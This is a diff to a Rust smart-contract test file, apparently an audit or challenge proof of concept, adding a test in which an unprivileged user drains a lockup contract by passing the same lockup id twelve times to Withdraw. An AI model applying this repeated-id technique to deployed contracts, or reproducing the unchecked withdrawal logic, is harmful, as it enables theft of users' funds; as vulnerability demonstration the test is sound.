@@ -106,12 +106,59 @@ pub mod tests {
         assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
     }
 
+    pub const UNPRIVILEGED_USER: &str = "unprivileged_user";
+
     #[test]
-    // does panic with overflow 
-    fn id_overflow() {
-        let mut i: u64 = std::u64::MAX - 10;
-        for _ in 0..11 {
-            i += 1;
-        }
+    fn exploit_withdraw_repeat_ids() {
+        // base scenario
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // mint funds to unprivileged user
+        app = mint_tokens(app, UNPRIVILEGED_USER.to_string(), MINIMUM_DEPOSIT_AMOUNT);
+        // deposit
+        let msg = ExecuteMsg::Deposit {};
+        let sender = Addr::unchecked(UNPRIVILEGED_USER);
+        app.execute_contract(
+            sender.clone(),
+            contract_addr.clone(),
+            &msg,
+            &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
+        )
+        .unwrap();
+        let msg = QueryMsg::GetLockup { id: 2 };
+        let lockup: Lockup = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &msg)
+            .unwrap();
+        assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
+        assert_eq!(lockup.owner, sender);
+
+        // fast forward 24 hrs
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(LOCK_PERIOD);
+        });
+
+        // contract balance is existing balance + user deposit + unprivileged user deposit
+        // 10 + 1 + 1 = 12 MINIMUM_DEPOSIT_AMOUNT
+        let balance = app
+            .wrap()
+            .query_balance(contract_addr.clone(), DENOM)
+            .unwrap()
+            .amount;
+        assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT * Uint128::new(12));
+
+        // EXPLOIT: unprivileged repeated withdraw
+        let msg = ExecuteMsg::Withdraw { ids: vec![2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2] };
+        app.execute_contract(sender, contract_addr.clone(), &msg, &[])
+            .unwrap();
+
+        // contract is drained :(
+        let balance = app
+            .wrap()
+            .query_balance(contract_addr, DENOM)
+            .unwrap()
+            .amount;
+        assert_eq!(balance, Uint128::zero());
+
     }
 }
